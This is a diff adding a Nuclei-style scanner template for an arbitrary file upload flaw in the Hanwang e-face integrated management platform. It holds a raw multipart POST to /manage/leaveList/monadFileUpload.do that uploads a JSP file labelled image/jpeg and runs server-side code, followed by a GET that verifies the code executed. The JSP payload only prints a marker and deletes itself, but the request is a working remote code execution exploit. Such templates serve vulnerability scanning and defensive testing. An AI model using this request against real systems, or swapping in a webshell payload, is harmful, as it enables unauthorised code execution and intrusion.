@@ -1,0 +1,56 @@
+id: hanwang-monadFileUpload-fileupload
+info:
+  name: 汉王e脸通综合管理平台 monadFileUpload.do 任意文件上传漏洞
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - https://mp.weixin.qq.com/s/izg6gUpZ1WIhKE0JeWqJYQ
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    hunter-query: demo
+    tips:
+    repair:
+    version:
+  tags: fileupload,hanwang
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y%M%D%H%M%S")}}'
+
+http:
+  - raw:
+      - |
+        POST /manage/leaveList/monadFileUpload.do?recoToken=67mds2pxXQb&type= HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Content-Length: 495
+
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.jsp"
+        Content-Type: image/jpeg
+        
+        <%out.print("{{randstr}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+        
+      - |+
+        GET /manage/{{filepath}} HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors: 
+      - type: json
+        part: body_1
+        internal: true
+        name: filepath
+        json:
+          - ".obj"
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+          - contains(body_2,'{{randstr}}')
+        condition: and
